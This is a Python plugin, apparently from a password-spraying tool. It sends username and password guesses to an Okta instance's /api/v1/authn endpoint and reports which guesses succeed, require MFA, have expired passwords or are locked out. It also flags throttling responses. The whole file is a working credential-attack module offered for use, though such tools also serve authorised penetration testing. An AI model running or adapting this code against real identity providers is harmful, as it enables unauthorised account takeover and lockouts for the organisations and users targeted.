import random
import json

class Plugin:
    def __init__(self, requester, pluginargs):
        self.requester = requester
        self.pluginargs = pluginargs
    
    def validate(self):
        err = None
        if not "url" in self.pluginargs.keys():
            err = "Okta plugin needs 'url' argument. Please add it to the config file, specifying the URL to the Okta instance."
        return "url" in self.pluginargs, err

    def testconnect(self, useragent):
        r = self.requester.get(self.pluginargs["url"], headers={"User-Agent": useragent})
        return r.status_code != 504
    
    def test_authenticate(self, username, password, useragent):
        data_response = {
            "result": None,
            "error": False,
            "output": "Blah",
            "request": None
        }

        raw_body = f'{{"username":"{username}","password":"{password}","options":{{"warnBeforePasswordExpired":true,"multiOptionalFactorEnroll":true}}}}'

        headers = {
                'User-Agent' : useragent,
                'Content-Type' : 'application/json'
        }

        try:
            resp = self.requester.post(f"{self.pluginargs['url']}/api/v1/authn/",data=raw_body, headers=headers)
            data_response['request'] = resp
            if resp.status_code == 200:
                resp_json = json.loads(resp.text)

                if resp_json.get("status") == "LOCKED_OUT": #Warning: administrators can configure Okta to not indicate that an account is locked out. Fair warning ;)
                    data_response['result'] = "failure"
                    data_response['output'] = f"[-] FAILURE: Locked out {username}:{password}"

                elif resp_json.get("status") == "SUCCESS":
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS: => {username}:{password}"

                elif resp_json.get("status") == "MFA_REQUIRED":
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS: 2FA => {username}:{password}"

                elif resp_json.get("status") == "PASSWORD_EXPIRED":
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS: password expired {username}:{password}"

                elif resp_json.get("status") == "MFA_ENROLL":
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS: MFA enrollment required {username}:{password}"

                else:
                    data_response['result'] = "failure"
                    data_response['output'] = f"[?] ALERT: 200 but doesn't indicate success {username}:{password}"

            elif resp.status_code == 403:
                    data_response['result'] = "failure"
                    data_response['output'] = f"[-] FAILURE THROTTLE INDICATED: {resp.status_code} => {username}:{password}"

            else:
                data_response['result'] = "failure"
                data_response['output'] = f"[-] FAILURE: {resp.status_code} => {username}:{password}"


        except Exception as ex:
            data_response['error'] = True
            data_response['output'] = str(ex.__repr__())
            pass

        return data_response